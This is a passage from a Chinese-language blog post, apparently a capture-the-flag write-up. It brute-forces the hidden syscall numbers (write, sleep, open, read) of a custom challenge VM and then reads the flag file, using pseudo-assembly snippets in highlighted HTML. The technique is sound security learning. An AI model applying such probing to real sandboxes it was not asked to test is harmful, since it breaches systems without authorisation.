</span></span><span style="display:flex;"><span>  reg <span style="color:#f92672">=</span> get_possible_registers()<span style="color:#f92672">.</span>pop()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> inst <span style="color:#f92672">in</span> get_possible_instructions():
</span></span><span style="display:flex;"><span>      imm reg, <span style="color:#ae81ff">0xff</span><span style="color:#f92672">-</span>reg
</span></span><span style="display:flex;"><span>      imm s, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>      inst reg, s
</span></span><span style="display:flex;"><span>      ldm i, reg
</span></span><span style="display:flex;"><span>      imm register_invalid, <span style="color:#ae81ff">0</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-15" class="outline-3">
<h3 id="headline-15">
寻找write系统调用
</h3>
<div id="outline-text-headline-15" class="outline-text-3">
<p>虽然仍然不能区分剩下的通用寄存器和标志寄存器，但是我们知道标准输出的描述符是1，因此可以将这五个寄存器的的值都设为1，在内存地址1的地方写入一个特殊字符，遍历系统调用检查是否打印了特殊字符。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm abcdf, 1</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm s, 0x99</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># stm a, s</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># sys [write], register_invalid</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> syscall <span style="color:#f92672">in</span> get_possible_syscalls():
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> get_possible_registers():
</span></span><span style="display:flex;"><span>          imm r, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>      imm s, <span style="color:#ae81ff">0x99</span>
</span></span><span style="display:flex;"><span>      stm a, s
</span></span><span style="display:flex;"><span>      sys syscall, register_invalid</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-16" class="outline-3">
<h3 id="headline-16">
寻找通用寄存器abc
</h3>
<div id="outline-text-headline-16" class="outline-text-3">
<p>知道write系统调用后，可以尝试构造一个特殊字符串，遍历寄存器abc并调用write检查输出来找到这三个寄存器。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm [a], 1</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm [b], 0x92</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># stm [b], [b]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm [b], 0x91</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># stm [b], [b]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm b, 0x90</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># stm [b], [b]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm [c], 3</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># sys write, register_invalid</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-17" class="outline-3">
<h3 id="headline-17">
寻找sleep系统调用
</h3>
<div id="outline-text-headline-17" class="outline-text-3">
<p>将寄存器a设为一个较大的值，遍历剩余系统调用，过了很久还没退出的则是sleep。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm a, 80</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm b, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm c, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># sys [sleep], register_invalid</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-18" class="outline-3">
<h3 id="headline-18">
寻找open read系统调用
</h3>
<div id="outline-text-headline-18" class="outline-text-3">
<p>在本机新建一个临时文本文件，遍历剩余系统调用尝试打开文件并读取文件内容，然后使用write输出，若能成功输出内容则找到了open和read。代码略。</p>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-19" class="outline-2">
<h2 id="headline-19">
总结
</h2>
<div id="outline-text-headline-19" class="outline-text-2">
<p>在推测出open，read后，就可以读取flag并用write输出的控制台了。</p>
</div>
</div>
<div id="outline-container-headline-20" class="outline-2">
<h2 id="headline-20">
参考
</h2>
<div id="outline-text-headline-20" class="outline-text-2">
<ul>
<li><a href="https://www.digitalwhisper.co.il/files/Zines/0x91/DW145-6-Yan85_SideChannel.pdf"> Side-Channel ומתקפות anY58 על ארכיטקטורת</a></li>
</ul>
</div>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
